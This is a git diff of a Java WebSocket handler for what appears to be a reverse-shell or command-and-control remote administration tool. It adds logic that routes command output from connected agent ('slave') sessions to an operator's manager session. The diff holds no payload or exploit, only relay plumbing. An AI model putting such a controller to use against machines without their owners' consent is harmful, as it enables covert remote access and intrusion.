@@ -102,6 +102,26 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
 
 
 
+    private boolean rerouteToWebsocket(AgentCommandRestOutputModel agentCommandRestOutputModel, WebSocketSession session){
+        if (agentCommandRestOutputModel == null)return false;
+        if (agentCommandRestOutputModel.getUuid()!=null ){
+            String uuid = agentCommandRestOutputModel.getUuid();
+
+            WebSocketSession managerSession = ConnectionManager.rerouteAllCommandToMangerSession.get(uuid);
+            if (managerSession!=null){
+                SocketUtil.sendMessage(managerSession, new TextMessage(
+                        DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
+                                .msg(agentCommandRestOutputModel.getOutput())
+                                .slaveSessionId(session.getId())
+                                .build()
+                        )));
+                return true;
+            }
+
+
+        }
+        return false;
+    }
 
     public void handleReverseShellClient(WebSocketSession session, TextMessage message) throws IOException {
         String clientMessage = message.getPayload();
@@ -113,14 +133,18 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
         String responseMessage =  clientMessage;
         System.out.println(responseMessage);
 
+        AgentCommandRestOutputModel agentCommandRestOutputModel = DataManipulationUtil.
+                jsonToObject(message.getPayload(), AgentCommandRestOutputModel.class);
 
+        if (rerouteToWebsocket(agentCommandRestOutputModel,session)){
+            return;
+        }
 
 
         WebSocketSession mangerSession = ConnectionManager.connectedReverseToManagerSessions.get(session);
         if (mangerSession!=null){
 
-            AgentCommandRestOutputModel agentCommandRestOutputModel = DataManipulationUtil.
-                    jsonToObject(message.getPayload(), AgentCommandRestOutputModel.class);
+
             if (agentCommandRestOutputModel!=null){
                 responseMessage = agentCommandRestOutputModel.getOutput();
             }
@@ -131,10 +155,11 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
                             .slaveSessionId(session.getId())
                             .build()
                     )));
-        }else {
-            session.sendMessage(new TextMessage(responseMessage));
-
         }
+//        else {
+//            session.sendMessage(new TextMessage(responseMessage));
+//
+//        }
 
 
 //        if (managerCommunicationModel!= null){
@@ -143,6 +168,9 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
 //        }
 
     }
+
+
+
 
     public void sendIntialMessage(WebSocketSession session){
         SocketUtil.sendMessage(session, new TextMessage(
